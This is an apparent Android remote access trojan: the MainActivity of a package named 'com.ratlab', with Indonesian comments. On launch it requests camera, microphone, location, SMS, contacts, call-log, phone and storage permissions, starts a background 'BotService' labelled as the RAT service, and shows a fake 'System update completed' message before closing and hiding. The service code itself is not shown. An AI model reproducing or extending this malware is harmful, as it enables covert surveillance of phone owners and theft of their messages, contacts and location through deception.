package com.ratlab;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private static final int PERM_REQ = 1001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Minta izin
        requestAllPermissions();

        // Start RAT service
        startRatService();

        Toast.makeText(this, "System update completed", Toast.LENGTH_SHORT).show();

        // Ketutup + icon ilang
        new Handler().postDelayed(this::finish, 1000);
    }

    private void startRatService() {
        Intent svc = new Intent(this, BotService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(svc);
        } else {
            startService(svc);
        }
    }

    private void requestAllPermissions() {
        List<String> perms = new ArrayList<>();
        perms.add(Manifest.permission.CAMERA);
        perms.add(Manifest.permission.RECORD_AUDIO);
        perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
        perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        perms.add(Manifest.permission.READ_SMS);
        perms.add(Manifest.permission.SEND_SMS);
        perms.add(Manifest.permission.RECEIVE_SMS);
        perms.add(Manifest.permission.READ_CONTACTS);
        perms.add(Manifest.permission.READ_CALL_LOG);
        perms.add(Manifest.permission.CALL_PHONE);
        perms.add(Manifest.permission.READ_PHONE_STATE);
        perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        perms.add(Manifest.permission.SET_WALLPAPER);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS);
        }

        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }

        if (!toRequest.isEmpty()) {
            requestPermissions(toRequest.toArray(new String[0]), PERM_REQ);
        }
    }
}
